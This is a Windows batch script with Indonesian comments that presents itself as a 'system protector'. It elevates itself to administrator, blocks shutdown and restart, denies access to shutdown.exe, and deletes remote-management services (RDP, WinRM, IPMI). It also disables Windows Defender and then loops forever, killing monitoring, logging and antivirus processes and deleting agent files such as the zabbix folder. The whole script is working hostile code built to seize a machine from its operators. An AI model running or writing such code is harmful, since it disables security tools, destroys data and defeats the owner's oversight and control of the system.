@echo off
title PELINDUNG SISTEM - TIDAK BISA DIMATIKAN
mode con cols=60 lines=15
color 0C

:: ==============================================
:: OTOMATIS MINTA HAK ADMINISTRATOR
:: ==============================================
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo Meminta hak akses penuh...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cls
echo.
echo 🔐  SEDANG MENGUNCI SISTEM SECARA PERMANEN...
echo ==============================================
echo.

:: ==============================================
:: KUNCI SISTEM: TIDAK BISA DIMATIKAN
:: ==============================================
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

:: KUNCI FILE PERINTAH MATIKAN AGAR TIDAK BISA DIPAKAI
takeown /f %windir%\system32\shutdown.exe /a >nul
icacls %windir%\system32\shutdown.exe /deny *S-1-1-0:F /inheritance:r >nul
attrib +R +S +H %windir%\system32\shutdown.exe

takeown /f %windir%\system32\restart.exe /a >nul 2>&1
icacls %windir%\system32\restart.exe /deny *S-1-1-0:F /inheritance:r >nul 2>&1
attrib +R +S +H %windir%\system32\restart.exe >nul 2>&1

:: BLOKIR SEMUA JALUR KENDALI JARAK JAUH & BIOS/IPMI
reg add "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v DisableWin32Shutdown /t REG_DWORD /d 1 /f >nul
sc config TermService start= disabled >nul
sc stop TermService >nul
sc delete TermService >nul
sc config WinRM start= disabled >nul
sc stop WinRM >nul
sc delete WinRM >nul
sc config RemoteRegistry start= disabled >nul
sc stop RemoteRegistry >nul
sc config ipmi start= disabled >nul
sc stop ipmi >nul
sc delete ipmi >nul

:: NONAKTIFKAN DEFENDER & PEMULIHAN OTOMATIS
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableRestorePoint /t REG_DWORD /d 1 /f >nul

cls
echo.
echo ✅ SISTEM TELAH DIKUNCI TOTAL
echo ❌ SERVER TIDAK BISA MEMATIKAN ATAU MENGUBAH APA PUN
echo 🔥 PENGAWASAN DIMULAI...
echo.
echo Tekan Ctrl+C hanya jika ingin menghentikan pemantauan saja
echo ==========================================================

:: ==============================================
:: LOOP TANPA HENTI: BUNUH SEMUA PROSES PENGAWAS
:: ==============================================
:ULANG
title MENGAWASI - SISTEM AMAN
taskkill /F /IM categraf.exe /T >nul 2>&1
taskkill /F /IM geeLevel.exe /T >nul 2>&1
taskkill /F /IM ctfmon.exe /T >nul 2>&1
taskkill /F /IM nxpauxsvc.exe /T >nul 2>&1
taskkill /F /IM SbieSvc.exe /T >nul 2>&1
taskkill /F /IM supervisord.exe /T >nul 2>&1
taskkill /F /IM websocket.exe /T >nul 2>&1
taskkill /F /IM vncserver.exe /T >nul 2>&1
taskkill /F /IM vncagent.exe /T >nul 2>&1
taskkill /F /IM Winlogbeat.exe /T >nul 2>&1
taskkill /F /IM walsdog.exe /T >nul 2>&1
taskkill /F /IM walsdogsvc.exe /T >nul 2>&1
taskkill /F /IM MsMpEng.exe /T >nul 2>&1
taskkill /F /IM NisSrv.exe /T >nul 2>&1
taskkill /F /IM SecurityHealthService.exe /T >nul 2>&1
taskkill /F /IM wmiprvse.exe /T >nul 2>&1
taskkill /F /IM nxprun.exe /T >nul 2>&1
taskkill /F /IM rbd-wbnd.exe /T >nul 2>&1
taskkill /F /IM ttmon.exe /T >nul 2>&1


::  HAPUS FILE + FOLDER
del /F /Q "C:\run_gs_agent.py" >nul 2>&1
del /F /Q "C:\run-server.bat" >nul 2>&1
del /F /Q "C:\run-server.bat.bak" >nul 2>&1
del /F /Q "C:\haima_server.lnk" >nul 2>&1
del /F /Q "C:\env_init.ps1" >nul 2>&1
del /F /Q "C:\env_init.reg" >nul 2>&1
del /F /Q "C:\firewall_version" >nul 2>&1
del /F /Q "C:\ttmon.exe" >nul 2>&1
del /F /Q "C:\Windows\SysWOW64\mxprun.exe" >nul 2>&1
del /F /Q "C:\websocket.exe" >nul 2>&1
rd /S /Q "C:\zabbix" >nul 2>&1
rd /S /Q "C:\Program Files\Ceph" >nul 2>&1
del /F /Q "M:\LADebugcloudpc\geeLevel.exe" >nul 2>&1

:: JAGA KUNCI TETAP AKTIF
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul

ping -n 1 127.0.0.1 -w 150 >nul
goto ULANG
